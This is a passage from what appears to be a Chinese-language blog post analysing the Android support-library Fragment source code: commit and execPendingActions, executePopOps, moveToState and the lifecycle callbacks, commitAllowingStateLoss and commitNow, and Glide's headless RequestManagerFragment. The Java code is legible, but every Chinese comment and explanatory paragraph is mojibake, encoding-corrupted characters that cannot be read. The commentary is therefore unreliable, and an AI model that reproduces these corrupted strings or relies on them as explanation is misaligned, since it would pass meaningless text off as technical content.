PrintWriter pw = new PrintWriter(logw); dump(&quot; &quot;, null, pw, null); pw.close(); } mCommitted = true; if (mAddToBackStack) {//å¦‚æœè°ƒç”¨è¿‡addToBackStackï¼Œè¿™ä¸ªå€¼å°±ä¸ºtrueï¼Œå¦åˆ™ä¸ºfalse mIndex = mManager.allocBackStackIndex(this);// å°†BackStackRecordæ·»åŠ åˆ°ä¸€ä¸ªArrayListçš„å°¾éƒ¨ï¼ŒListä¸å­˜åœ¨åˆ™åˆ›å»º } else { mIndex = -1; } mManager.enqueueAction(this, allowStateLoss); // è¿™é‡Œå°±æ˜¯è°ƒç”¨FragmnetManagerçš„æ–¹æ³•ï¼Œæ·»åŠ åˆ°FragmentManagerçš„mPendingActionsä¸­ï¼Œå¹¶scheduleCommitï¼ˆé€šè¿‡FragmnetHostCallBackå¾€ä¸»çº¿ç¨‹postä¸€æ¡runnableï¼‰ return mIndex; //è¿”å›çš„å°±æ˜¯æœ¬æ¬¡äº‹åŠ¡çš„mIndex } // FragmentManagerImpl /**è¿™é‡Œå°±æ˜¯è¢«æ¨é€åˆ°ä¸»çº¿ç¨‹çš„runnableï¼Œæ³¨æ„ï¼Œè¿™é‡Œæ˜¯å¼‚æ­¥çš„ * Only call from main thread! */ public boolean execPendingActions() { ensureExecReady(true); boolean didSomething = false; //è¿™é‡Œå°±æ˜¯ä¸æ–­çš„ä»mPendingActionä¸­æŸ¥æ‰¾å¾…æ‰§è¡Œçš„æ“ä½œ while (generateOpsForPendingActions(mTmpRecords, mTmpIsPop)) { mExecutingActions = true; try { optimizeAndExecuteOps(mTmpRecords, mTmpIsPop); //ä»æ–¹æ³•åå¤§è‡´èƒ½çŒœåˆ°è¿™é‡Œæ˜¯æ‰§è¡Œæ“ä½œçš„åœ°æ–¹,ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¾…æ‰§è¡Œçš„æ“ä½œçš„Listï¼Œä¸€ä¸ªæ˜¯å¯¹åº”æ¯é¡¹æ“ä½œæ˜¯popè¿˜push(å‡ºæ ˆè¿˜æ˜¯å…¥æ ˆ) } finally { cleanupExec(); } didSomething = true; } doPendingDeferredStart(); return didSomething; } private void optimizeAndExecuteOps(ArrayList&lt;BackStackRecord&gt; records, ArrayList&lt;Boolean&gt; isRecordPop) { } éšåè°ƒç”¨äº†executeOpsTogetheræ–¹æ³•ï¼Œæ¥ç€è°ƒç”¨ executeOps(records, isRecordPop, startIndex, endIndex); æœ€ç»ˆåˆèµ°åˆ°äº†BackStackRecordçš„æ–¹æ³•é‡Œé¢ /** * Reverses the execution of the operations within this transaction. The Fragment states will * only be modified if optimizations are not allowed. * * @param moveToState {@code true} if added fragments should be moved to their final state * in unoptimized transactions */ void executePopOps(boolean moveToState) { for (int opNum = mOps.size() - 1; opNum &gt;= 0; opNum--) { //å€’åºæ‰§è¡Œ,æ¯ä¸€ä¸ªopsåŒ…å«äº†å¯¹ä¸€ä¸ªFragmentçš„æŒ‡ä»¤ï¼Œéå†æ‰€æœ‰çš„ops final Op op = mOps.get(opNum); Fragment f = op.fragment; f.setNextTransition(FragmentManagerImpl.reverseTransit(mTransition), mTransitionStyle); switch (op.cmd) { //è¿™äº›æ“ä½œå…¨éƒ¨åªæ˜¯è®¾ç½®ä¸€äº›å˜é‡çš„å€¼ï¼Œæš‚æ—¶è¿˜æ²¡åˆ°UIæ›´æ”¹ï¼Œå…·ä½“çš„UIæ“ä½œåœ¨moveToStateé‡Œé¢ case OP_ADD: f.setNextAnim(op.popExitAnim); mManager.removeFragment(f); //ä»FragmentManagerçš„mAddedä¸­ç§»é™¤è¯¥fragmentï¼Œfragmentçš„mAdded = false,mRemoving = true; break; case OP_REMOVE: f.setNextAnim(op.popEnterAnim); mManager.addFragment(f, false); /** addFragmenté‡Œé¢æœ‰è¿™ä¹ˆä¸€æ®µ if (mAdded.contains(fragment)) { throw new IllegalStateException(&quot;Fragment already added: &quot; + fragment); //å°±æ˜¯ç®€å•çš„åˆ¤æ–­ä¸‹Listä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœåœ¨ä¸€ä¸ªFragmentå·²ç»addedçš„æƒ…å†µä¸‹å†å»addï¼Œå°±ä¼šå‡ºç°è¿™ç§é”™è¯¯ }**/ break; case OP_HIDE: f.setNextAnim(op.popEnterAnim); mManager.showFragment(f); // åªæ˜¯å°†fragmentçš„mHiddenè®¾ç½®ä¸ºfalseäº† break; case OP_SHOW: f.setNextAnim(op.popExitAnim); mManager.hideFragment(f); // åªæ˜¯å°†fragmentçš„mHiddenè®¾ç½®ä¸ºtrueäº† break; case OP_DETACH: f.setNextAnim(op.popEnterAnim); mManager.attachFragment(f); //å’Œattachå·®ä¸å¤šï¼Œä¹Ÿæ˜¯è®¾å®šäº†ä¸€äº›æ ‡å¿—ä½ break; case OP_ATTACH: f.setNextAnim(op.popExitAnim); mManager.detachFragment(f); // mFragment.mDetached = false,è¿™é‡Œåˆ¤æ–­äº†manager.mAdded.contains(mFragment)ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸Fragment already added!å¦‚æœæ­£å¸¸çš„è¯æŠŠmFragmentæ·»åŠ åˆ°mAddedé‡Œé¢ break; default: throw new IllegalArgumentException(&quot;Unknown cmd: &quot; + op.cmd); } if (!mAllowOptimization &amp;&amp; op.cmd != OP_ADD) { mManager.moveFragmentToExpectedState(f); } } if (!mAllowOptimization) { // Added fragments are added at the end to comply with prior behavior. mManager.moveToState(mManager.mCurState, true); } } é€šå¸¸æˆ‘ä»¬éƒ½æ˜¯åœ¨ä¸»çº¿ç¨‹å¾€Manageræ·»åŠ Transactionï¼Œä¸è¿‡ä»è¿™é‡Œçœ‹æ¥ï¼Œæ·»åŠ Transactionåªæ˜¯æ·»åŠ äº†ä¸€ä»½BackStackRecordï¼Œæœ€ç»ˆæ‰§è¡Œè¿˜æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Šåšçš„ã€‚å¾ˆç›´è§‚çš„çœ‹åˆ°è¿™é‡Œ è°ƒç”¨äº†managerçš„removeFragmentã€showFragmentç­‰æ–¹æ³•.éšä¾¿æŒ‘ä¸¤ä¸ª // FragmentManagerImpl.java public void addFragment(Fragment fragment, boolean moveToStateNow) { if (mAdded == null) { mAdded = new ArrayList&lt;Fragment&gt;(); } makeActive(fragment); if (!fragment.mDetached) { if (mAdded.contains(fragment)) { throw new IllegalStateException(&quot;Fragment already added: &quot; + fragment); } mAdded.add(fragment); fragment.mAdded = true; // è®°å¾—fragment.isAdded()æ–¹æ³•å—ï¼Œåœ¨è¿™é‡Œè¢«è®¾ç½®çš„ fragment.mRemoving = false; if (fragment.mView == null) { fragment.mHiddenChanged = false; } if (fragment.mHasMenu &amp;&amp; fragment.mMenuVisible) { mNeedMenuInvalidate = true; } if (moveToStateNow) { moveToState(fragment); } } } // showçš„æ–¹æ³•å¼‚å¸¸ç®€å• /** * Marks a fragment as shown to be later animated in with * {@link #completeShowHideFragment(Fragment)}. * * @param fragment The fragment to be shown. */ public void showFragment(Fragment fragment) { if (fragment.mHidden) { fragment.mHidden = false; //è¿™é‡Œåªæ˜¯è®¾ç½®ä¸€ä¸‹æ ‡å¿—ä½ // Toggle hidden changed so that if a fragment goes through show/hide/show // it doesn&#39;t go through the animation. fragment.mHiddenChanged = !fragment.mHiddenChanged; } } æ¥ä¸‹é‡Œå°±æ˜¯FragmentManagerçš„MoveToStateæ–¹æ³•äº†ï¼Œéå¸¸é•¿å…ˆè®°ä½Fragmentçš„å‡ ä¸ªçŠ¶æ€ï¼Œè¿™äº›éƒ½æ˜¯Adam powellè¯´è¿‡çš„ï¼Œè¿™æ˜¯çº¿æ€§çš„ï¼ŒmoveToStateæ–¹æ³•ä¹Ÿæ˜¯è¿™æ ·èµ°çš„ï¼Œä¸ä¼šè·³è¿‡ä¸­é—´æŸä¸ªstate static final int INITIALIZING = 0; // Not yet created. static final int CREATED = 1; // Created. static final int ACTIVITY_CREATED = 2; // The activity has finished its creation. static final int STOPPED = 3; // Fully created, not started. static final int STARTED = 4; // Created and started, not resumed. static final int RESUMED = 5; // Created started and resumed. moveToStateçš„æ–¹æ³•æ¯”è¾ƒé•¿ï¼Œåˆ æ‰ä¸€äº›ä¸å¿…è¦çš„ï¼Œé‡ç‚¹å…³æ³¨Fragmentçš„é‚£äº›ç”Ÿå‘½å‘¨æœŸå›è°ƒæ˜¯ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨çš„ã€‚å»ºè®®çœ‹æºç ï¼Œæˆ‘è¿™é‡Œåˆ é™¤äº†å¾ˆå¤šè¿˜æœ‰ä¸€å¤§å¨ã€‚ // FragmentManagerImpl.java void moveToState(Fragment f, int newState, int transit, int transitionStyle, boolean keepActive) { //Fragmentçš„stateå°†æé«˜ï¼Œä¾‹å¦‚ä»ACTIVITY_CREATEDåˆ°ACTIVITYCREATED if (f.mState &lt; newState) { switch (f.mState) { case Fragment.INITIALIZING://å°šæœªåˆå§‹åŒ– if (f.mSavedFragmentState != null) { //ä»SavedStateä¸­è·å–å„ä¸ªViewçš„çŠ¶æ€ï¼Œå°è¯•æ¢å¤Viewçš„çŠ¶æ€ } f.mHost = mHost; //ä»è¿™ä¸€åˆ»å¼€å§‹,getActivityï¼ŒgetContextï¼ŒisAddedç­‰å’ŒActivityç›¸å…³çš„æ–¹æ³•éƒ½æœ‰æ­£ç¡®çš„è¿”å› f.mCalled = false; //è¿™ä¸ªmCalledæ˜¯ä¸ºäº†é¿å…å­ç±»å¿˜è®°è°ƒç”¨superæ–¹æ³•çš„ f.onAttach(mHost.getContext()); // onAttachå°±æ˜¯åœ¨è¿™é‡Œè°ƒç”¨çš„ if (f.mParentFragment == null) { mHost.onAttachFragment(f);//mHostå…¶å®å°±æ˜¯Activity } else { f.mParentFragment.onAttachFragment(f); //è¿™ä¸ªæ˜¯ChildFragmentçš„æƒ…å†µ } dispatchOnFragmentAttached(f, mHost.getContext(), false); if (!f.mRetaining) { f.performCreate(f.mSavedFragmentState); //è¿™é‡Œé¢è°ƒç”¨äº†onCreateå›è°ƒï¼ŒåŒæ—¶STATEå˜æˆCREATED dispatchOnFragmentCreated(f, f.mSavedFragmentState, false); } else { f.restoreChildFragmentState(f.mSavedFragmentState); f.mState = Fragment.CREATED; } f.mRetaining = false; if (f.mFromLayout) {//å†™åœ¨XMLé‡Œé¢çš„ï¼Œç›´æ¥åœ¨ä»INITIALIZINGåˆ°CREATEDçš„è¿‡ç¨‹ä¸­æŠŠperformCreateViewå’ŒonViewCreatedèµ°ä¸€é } case Fragment.CREATED: if (newState &gt; Fragment.CREATED) { if (!f.mFromLayout) { //ä¸æ˜¯å†™åœ¨xmlæ ‡ç­¾ä¸­çš„Fragment ViewGroup container = null; if (f.mContainerId != 0) { container = (ViewGroup) mContainer.onFindViewById(f.mContainerId); } f.mContainer = container; f.mView = f.performCreateView(f.getLayoutInflater( f.mSavedFragmentState), container, f.mSavedFragmentState);// onCreateViewå›è°ƒ if (f.mView != null) { f.mInnerView = f.mView; if (container != null) { container.addView(f.mView);//æ‰€ä»¥Fragmentæœ¬è´¨ä¸Šåªæ˜¯addViewåˆ°Containeré‡Œ } if (f.mHidden) { //hideå°±åªæ˜¯è®¾ç½®Visibilityè¿™ä¹ˆç®€å•ï¼Œè¿™mHdiddenæ˜¯åœ¨ä¸Šé¢çš„showFragmenté‡Œé¢è®¾ç½®çš„ f.mView.setVisibility(View.GONE); } f.onViewCreated(f.mView, f.mSavedFragmentState);// åˆæ˜¯å›è°ƒ,onViewCreatedç¡®å®æ˜¯åœ¨onCreatedViewä¹‹åç«‹é©¬æ·»åŠ çš„ dispatchOnFragmentViewCreated(f, f.mView, f.mSavedFragmentState, false); // Only animate the view if it is visible. This is done after // dispatchOnFragmentViewCreated in case visibility is changed f.mIsNewlyAdded = (f.mView.getVisibility() == View.VISIBLE) &amp;&amp; f.mContainer != null; } else { f.mInnerView = null; } } //éšåé©¬ä¸Šå°±è°ƒç”¨åˆ°äº†onActivityCreatedäº†ï¼ŒåŒä¸€ä¸ªMessageä¸­ f.performActivityCreated(f.mSavedFragmentState); dispatchOnFragmentActivityCreated(f, f.mSavedFragmentState, false); if (f.mView != null) { f.restoreViewState(f.mSavedFragmentState); } f.mSavedFragmentState = null; } case Fragment.ACTIVITY_CREATED: if (newState &gt; Fragment.ACTIVITY_CREATED) { f.mState = Fragment.STOPPED; } case Fragment.STOPPED: if (newState &gt; Fragment.STOPPED) { if (DEBUG) Log.v(TAG, &quot;moveto STARTED: &quot; + f); f.performStart(); //éšåå¼€å§‹onStart dispatchOnFragmentStarted(f, false); } case Fragment.STARTED: if (newState &gt; Fragment.STARTED) { if (DEBUG) Log.v(TAG, &quot;moveto RESUMED: &quot; + f); f.performResume(); //onResume dispatchOnFragmentResumed(f, false); f.mSavedFragmentState = null; f.mSavedViewState = null; } } } else if (f.mState &gt; newState) { //Fragmentçš„STATEé™ä½ switch (f.mState) { case Fragment.RESUMED: if (newState &lt; Fragment.RESUMED) { f.performPause(); //onPause dispatchOnFragmentPaused(f, false); } case Fragment.STARTED: if (newState &lt; Fragment.STARTED) { f.performStop();//è°ƒç”¨onStop,stateå˜æˆSTOPPED dispatchOnFragmentStopped(f, false); } case Fragment.STOPPED: if (newState &lt; Fragment.STOPPED) { f.performReallyStop();//ä¸è°ƒç”¨å›è°ƒï¼ŒçŠ¶æ€å˜æˆACTIVITY_CREATED } case Fragment.ACTIVITY_CREATED: if (newState &lt; Fragment.ACTIVITY_CREATED) { f.performDestroyView(); //çŠ¶æ€å˜æˆCREATEDï¼Œè°ƒç”¨onDestoryViewã€‚æœ€åæ”¶å°¾è°ƒç”¨ f.mContainer.removeView(f.mView);//å¼•ç”¨ç½®ç©º dispatchOnFragmentViewDestroyed(f, false); if (f.mView != null &amp;&amp; f.mContainer != null) { f.mContainer.removeView(f.mView); } f.mContainer = null; f.mView = null; f.mInnerView = null; } case Fragment.CREATED: if (newState &lt; Fragment.CREATED) { if (DEBUG) Log.v(TAG, &quot;movefrom CREATED: &quot; + f); if (!f.mRetaining) { f.performDestroy(); dispatchOnFragmentDestroyed(f, false); } else { f.mState = Fragment.INITIALIZING; } f.performDetach(); dispatchOnFragmentDetached(f, false); if (!keepActive) { if (!f.mRetaining) { makeInactive(f); } else { f.mHost = null; //Fragmentå¯ä»¥åœ¨ActivityæŒ‚äº†ä¹‹åæ¥ç€å­˜åœ¨ï¼Œè¿™é‡Œåªæ˜¯é¿å…å†…å­˜æ³„æ¼ï¼Œé‚£ä¸ªæ–¹æ³•å«åšsetRetainStateå¥½åƒ f.mParentFragment = null; f.mFragmentManager = null; } } } } } } moveToStateçš„æ–¹æ³•å¾ˆé•¿ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥åˆ†ä¸ºstateå‡é«˜å’Œstateé™ä½æ¥çœ‹ï¼š stateå‡é«˜çš„è¿‡ç¨‹ä¸­ï¼š onAttachæ˜¯ç¬¬ä¸€ä¸ªå›è°ƒï¼Œè¿™é‡Œé¢ç»™Fragmentçš„mHostèµ‹å€¼ï¼›(å“åº”Fragment.CREATEDä¿¡å·) onCreateView,onViewCreatedæ˜¯åœ¨ä¸€ä¸ªæ–¹æ³•é‡Œè¿›è¡Œçš„ï¼Œæœ¬è´¨ä¸Šè°ƒç”¨çš„æ˜¯mContainer.addViewæ–¹æ³•ã€‚éšåç«‹å³è°ƒç”¨onActivityCreatedæ–¹æ³•(å“åº”Fragment.ACTIVITY_CREATEDæ–¹æ³•) onStartæ˜¯ç¬¬ä¸‰ä¸ªå›è°ƒï¼ŒonStartæ–‡æ¡£æ˜ç¡®è¡¨ç¤ºè¯¥æ–¹æ³•è°ƒç”¨æ—¶Fragmentå·²ç»å¯¹ç”¨æˆ·å¯è§ã€‚æ–‡æ¡£åŒæ—¶è¯´æ˜è¯¥æ–¹æ³•å’ŒActivityçš„onStartæ–¹æ³•æŒ‚é’©ï¼ŒåŸç†æ˜¯FragmentActivityçš„onStartä¸­è°ƒç”¨äº†mFragments.dispatchStart()æ–¹æ³•ã€‚ Fragmentå’ŒActivityç”Ÿå‘½å‘¨æœŸæŒ‚é’© FragmentActivityçš„onCreateä¸­è°ƒç”¨äº†FragmentManagerçš„dispatchCreateæ–¹æ³•ï¼Œå‘å‡ºFragment.CREATEDä¿¡å· FragmentActivityçš„onStartä¸­å…ˆè°ƒç”¨äº†dispatchActivityCreatedæ–¹æ³•ï¼ˆå‘å‡ºACTIVITY_CREATEDä¿¡å·ï¼‰ï¼Œéšåè°ƒç”¨dispatchStartï¼ˆå‘å‡ºFragment.STARTEDä¿¡å·ï¼‰ FragmentActivityçš„onResumeä¸­ç”¨Handlerå‘é€äº†ä¸€ä¸ªMessageï¼Œå¯¹åº”mFragments.dispatchResume(Fragment.RESUMEDä¿¡å·);FragmentActivityçš„onPostResumeä¸­ä¹Ÿè°ƒç”¨äº†dispatchResumeæ–¹æ³•ï¼Œä¸è¿‡moveToStateæ–¹æ³•æœ€åå·²ç»åˆ¤æ–­äº†newState&gt; currentStateã€‚ onPauseå’ŒonStopå’ŒonDestoryViewä¹Ÿå·®ä¸å¤šã€‚æ³¨æ„ï¼ŒDestoryViewå®è´¨åªæ˜¯å°†Fragmentçš„mViewä»containerä¸­ç§»é™¤ï¼Œè®¾ç½®mViewä¸ºnullï¼ŒmContainerä¸ºnull;onDestoryå…ˆäºonDetachè°ƒç”¨ FragmentActivityä¸­çš„dispatchActivityCreatedå’ŒdispatchFragmentStartedå†™åœ¨ä¸€ä¸ªæ–¹æ³•é‡Œï¼ŒåŒºåˆ«æ˜¯onActivityCreatedå…ˆäºonStartè°ƒç”¨ä¸”åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚æ‰€ä»¥onActivityCreatedå­˜åœ¨çš„æ„ä¹‰ä¸è¿‡æ˜¯ä¸ºäº†å¸®åŠ©åŒºåˆ†æ˜¯åˆæ¬¡startè¿˜æ˜¯åé¢å¤šæ¬¡çš„startï¼ˆActivityçš„onStartä¼šè¢«å¤šæ¬¡è°ƒç”¨ï¼‰ stateé™ä½çš„è¿‡ç¨‹å…¶å®ä¹Ÿå·®ä¸å¤šï¼Œæˆ‘ä¹Ÿæ‡’å¾—åˆ†æäº†ã€‚ä¹‹å‰ä»¥ä¸ºdetachå’Œattchæ–¹æ³•å¾ˆç‰¹æ®Šï¼Œå…¶å®åªæ˜¯ä»FragmentManagerçš„mAddedä¸­ç§»é™¤è¯¥Fragmentï¼Œå¹¶è®¾ç½®fragment.mAdded = false. ä»ä¸€ä¸ªstateåˆ°å¦ä¸€ä¸ªstateåŸºæœ¬çš„æ­¥éª¤å°±æ˜¯fragment.performXXXï¼Œç„¶ådispatchXXXï¼Œè¿™é‡Œé¢é¡ºæ‰‹æŠŠstateè®¾ç½®ä¸€ä¸‹ FragmentManagerçš„æ ¸å¿ƒæ–¹æ³•åº”è¯¥å°±æ˜¯è¿™ä¸ªmoveToStateæ–¹æ³•äº†ã€‚åˆ°æ­¤ï¼Œcommitåˆ†æç»“æŸã€‚è¯´ä¸€ä¸‹å‡ ä¸ªä¸å»ºè®®ä½¿ç”¨çš„æ–¹æ³•executePendingTransactions çœ‹äº†ä¸‹ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢æ²¡æœ‰å¼‚æ­¥æ–¹æ³•ï¼Œåˆ«çš„å°±ä¸æ¸…æ¥šäº†ã€‚æ®è¯´æ˜¯å°†æ‰€æœ‰çš„Transactionå…¨éƒ¨æ‰§è¡Œæ‰ï¼Œé¦–å…ˆè¿™é‡Œé¢æœ‰ä¸€å¤§å †æ“ä½œï¼Œä¼šå µä½ä¸»çº¿ç¨‹ï¼Œå…¶æ¬¡ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢æ¶‰åŠåˆ°å„ä¸ªçŠ¶æ€çš„åˆ¤æ–­ï¼Œå¾ˆæ··ä¹±ã€‚ commitAllowingStateLoss è¿™ä¸ªæ–¹æ³•å’Œcommitçš„å”¯ä¸€åŒºåˆ«æ˜¯è°ƒç”¨ä¸€ä¸ªå¯èƒ½ä¼šæŠ›å‡ºå¼‚å¸¸çš„æ–¹æ³•ï¼Œåé¢è¿˜æ˜¯postäº†ä¸€ä¸ªpendingAction,è¿˜æ˜¯å¼‚æ­¥çš„ã€‚æ‰€ä»¥å¾ˆå¤šäººçº·çº·è°ƒç”¨commitAllowingStateLossæ–¹æ³•ã€‚ç„¶è€Œï¼Œè¿™ä¸ªæ–¹æ³•å­˜åœ¨æ˜¯æœ‰å…¶æ„ä¹‰çš„ã€‚å®‰å“æœ¬èº«å°±æ˜¯ä¸ªå¼‚æ­¥çš„ç³»ç»Ÿã€‚Activityçš„onSaveInstanceStateéšæ—¶å¯èƒ½ä¼šè¢«è°ƒç”¨ï¼Œè°ƒç”¨ä¹‹åæ‰€æœ‰æœ‰idçš„Viewçš„onSaveInstanceStateéƒ½è¢«è°ƒç”¨äº†ã€‚è¿™ä¸ªæ—¶å€™å†å»å°è¯•åšä»»ä½•æ“ä½œéƒ½å¯èƒ½ä¼šé‡æ–°å¯¹å·²ç»ä¿å­˜äº†çŠ¶æ€çš„Viewé€ æˆå½±å“ã€‚Activityé‡æ–°æ¢å¤çš„æ—¶å€™ä¼šæŠŠsaveStateä¸­çš„çš„UIå¿«ç…§æ¢å¤ï¼Œè¿™ä¸€æ¬¡çš„æ“ä½œå°±ä¼šé€ æˆæ¢å¤çš„æ—¶å€™ä¸æ˜¯ä¿å­˜æ—¶çš„æ•ˆæœ.allowStateLossçš„å­—é¢æ„æ€å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯ç³»ç»Ÿä¸ä¿è¯æ­¤åViewçš„çŠ¶æ€èƒ½å¤Ÿæ­£ç¡®è¢«æ¢å¤ã€‚ private void checkStateLoss() { if (mStateSaved) { throw new IllegalStateException( &quot;Can not perform this action after onSaveInstanceState&quot;); } if (mNoTransactionsBecause != null) { throw new IllegalStateException( &quot;Can not perform this action inside of &quot; + mNoTransactionsBecause); } } commitNow æ³¨æ„24.2 ä¹‹åGoogleæ·»åŠ äº†ä¸€ä¸ªå•ç‹¬çš„commitNowæ–¹æ³•ï¼Œè¿™ä¸€ç‚¹Adam Powellåœ¨2016å¹´çš„IOä¸Šç‰¹åˆ«æåˆ°è¿‡ã€‚å†…éƒ¨æ‰§è¡Œäº†mTmpRecords(ä¸´æ—¶æ“ä½œ)ï¼Œç”±äºåªæ˜¯ä¸€é¡¹æ“ä½œï¼Œå¤–åŠ é‡Œé¢è¿˜å¯¹è¿™ä¸€æ¬¡æ“ä½œè¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ‰€ä»¥ç›´æ¥åŒæ­¥æ‰§è¡Œäº†ã€‚è¯¥æ–¹æ³•ä¸å…è®¸addToBackStackï¼Œå› ä¸ºè¿™å®è´¨ä¸Šç­‰åŒäºåœ¨æ‰€æœ‰pendingActionä¸­æ’é˜Ÿã€‚ç”±äºæ˜¯åŒæ­¥æ‰§è¡Œï¼Œè¯¥æ–¹æ³•ä¿è¯æ–¹æ³•è¿”å›ä¹‹åï¼Œæ‰€æœ‰çš„Fragmentéƒ½èƒ½å¤„äºæ‰€é¢„æœŸçš„stateã€‚ @Override public void commitNow() { disallowAddToBackStack(); mManager.execSingleAction(this, false); } @Override public void commitNowAllowingStateLoss() { disallowAddToBackStack(); mManager.execSingleAction(this, true); } commitNowAllowingStateLoss å’ŒcommitAllowingStateLossä¸€æ ·çš„é“ç†ï¼Œå¼€å‘è€…å¯èƒ½ä¸ç»æ„åœ¨Activityä¿å­˜äº†çŠ¶æ€ä¹‹åè°ƒç”¨è¯¥æ–¹æ³•ï¼Œè¿™è¿èƒŒäº†çŠ¶æ€ä¿å­˜å’Œæ¢å¤çš„åŸåˆ™ã€‚ä½†è¿˜æ˜¯å¼€äº†ä¸ªåé—¨ï¼Œå‰ææ˜¯ä¸ä¿è¯UIæ¢å¤çš„æ—¶å€™å‡ºç°éé¢„æœŸçš„è¡¨ç°ã€‚allowStateLossçš„æ–¹æ³•ç…§è¯´ä¸åº”è¯¥è°ƒç”¨ï¼Œå¦‚æœä¸è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„è¯ï¼Œä½¿ç”¨commitNowï¼Œè€Œä¸æ˜¯commit + executePendingTransactionsã€‚ åŒæ—¶ï¼ŒcommitNowä¹‹å‰æ£€æŸ¥ä¸‹mStateSavedæ˜¯å¦æ˜¯true,å…·ä½“æ¥è¯´Activityçš„onStopå’ŒonSaveInstanceStateè°ƒç”¨ä¹‹åè¿™ä¸ªå€¼éƒ½ä¼šä¸ºtrueã€‚ å…³äºActivityçš„onSaveInstanceStateä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨ï¼Œæ‰¾åˆ°æ¯”è¾ƒå¥½çš„è§£é‡Šã€‚ è®°ä½ï¼Œæ—‹è½¬å±å¹•çš„æ—¶å€™ä¸€å®šä¼šè°ƒç”¨çš„ã€‚ 4. ç°åœ¨å†æ¥çœ‹FragmentPagerAdapterå’ŒFragmentStatePagerAdapterè¿™ä¸¤ä¸ªç±»è¡Œæ•°éƒ½ä¸è¶…è¿‡300è¡Œï¼Œéå¸¸ç®€å•ï¼Œåªæ˜¯é€šè¿‡è°ƒç”¨FragmentManagerçš„ç›¸åº”æ–¹æ³•å®ç°å±•ç¤ºViewçš„åŠŸèƒ½ã€‚ 5. Fragmentçš„ä¸€äº›ä¸å¸¸ç”¨çš„APIattach,detach,FragmentLifecycleCallbacks,commitNowï¼ŒsetAllowOptimization(26.0.0åˆè¢«deprecatedäº†)onCreateViewè¿™ä¸ªåå­—æ˜¯æ€ä¹ˆæ¥çš„ï¼Œå…¶å®æ˜¯åœ¨dispatchFragmentsOnCreateViewé‡Œé¢è°ƒç”¨çš„ã€‚Activityå®ç°äº†onCreateView(LayoutInflaterå®šä¹‰çš„ï¼Œä¼šåœ¨getSytemServiceè¿”å›LayoutInflateræ—¶è°ƒç”¨ï¼Œè·å–ç³»ç»ŸæœåŠ¡æ¯•ç«Ÿæ˜¯ä¸€ä¸ªå¼‚æ­¥è¿‡ç¨‹)ã€‚ 6. å…³äºGlideæ˜¯å¦‚ä½•å®ç°ç”Ÿå‘½å‘¨æœŸç»‘å®šçš„Fragmentæœ¬èº«æä¾›äº†ç”Ÿå‘½å‘¨æœŸç›‘å¬å›è°ƒ registerFragmentLifecycleCallbacks 25.1.0 unregisterFragmentLifecycleCallbacks 25.1.0 addOnBackStackChangedListener 22.2.0 removeOnBackStackChangedListener 22.2.0 Glideçš„åšæ³•æ˜¯å†™äº†ä¸€ä¸ªSupportRequestManagerFragment åœ¨è¿™ä¸ªFragmentçš„æ„é€ å‡½æ•°é‡Œæ”¾äº†ä¸€ä¸ªActivityFragmentLifecycle å‚è€ƒ åœ¨è¿™ä¸ªFragmentçš„onStartï¼ŒOnStopç­‰æ–¹æ³•é‡Œé¢è°ƒç”¨è¯¥lifeCycleçš„onStart,onStopç­‰å›è°ƒ(lifeCycleæ˜¯æ¥å£ï¼Œç”±RequestManagerå®ç°) å…³é”®ä»£ç  if (current == null) { current = new RequestManagerFragment(); pendingRequestManagerFragments.put(fm, current); fm.beginTransaction().add(current, FRAGMENT_TAG).commitAllowingStateLoss(); handler.obtainMessage(ID_REMOVE_FRAGMENT_MANAGER, fm).sendToTarget(); } æ‰€ä»¥ç»å¸¸ä¼šåœ¨Debugçš„æ—¶å€™çœ‹åˆ°FragmentManageré‡Œé¢æœ‰ä¸ªâ€com.bumptech.glide.managerâ€çš„Fragmentã€‚è¿™ä¸ªFragmentæ²¡æœ‰å®ç°onCreateViewï¼Œæ‰€ä»¥ç›´æ¥è¿”å›nullã€‚Fragmentæœ¬èº«æ˜¯å¯ä»¥ä¸å¸¦Viewçš„ã€‚ 7. æ€»ç»“Fragmentçš„ä¸€äº›ç”Ÿå‘½å‘¨æœŸè¿˜æ˜¯éœ€è¦è·ŸActivityçš„ç”Ÿå‘½å‘¨æœŸä¸€èµ·çœ‹ï¼Œå¤§éƒ¨åˆ†æ˜¯å¼‚æ­¥æ“ä½œã€‚FragmentManagerç±»ä¼¼ä¸€ä¸ªç®¡ç†è€…ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨Activityçš„ç”Ÿå‘½å‘¨æœŸä¸­é¡ºæ‰‹å®ç°äº†å®¹å™¨ä¸­å…ƒç´ æ‰€è¦æ±‚çš„UIçŠ¶æ€ã€‚Fragmentæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªViewçš„Controllersï¼Œé€šè¿‡FragmentMangerå’ŒFragmentActivityçš„ç”Ÿå‘½å‘¨æœŸæŒ‚é’©ï¼Œå¹¶è‡ªåŠ¨åšå¥½Viewçš„çŠ¶æ€ä¿å­˜å’Œæ¢å¤ã€‚å…·ä½“çš„UIå±•ç¤ºæ— éæ˜¯addViewï¼ŒsetVisibilityç­‰å¸¸è§„çš„æ–¹æ³•ï¼Œä¹Ÿæ­£å› ä¸ºè¿™æ ·ï¼ŒsupportåŒ…é‡Œçš„Fragmentæ‰èƒ½åšåˆ°3.0ä»¥ä¸‹çš„é€‚é…ã€‚æ—¥å¸¸å¼€å‘ä¸­ï¼ŒFragmentèƒ½å¤Ÿå°†åŸæœ¬å 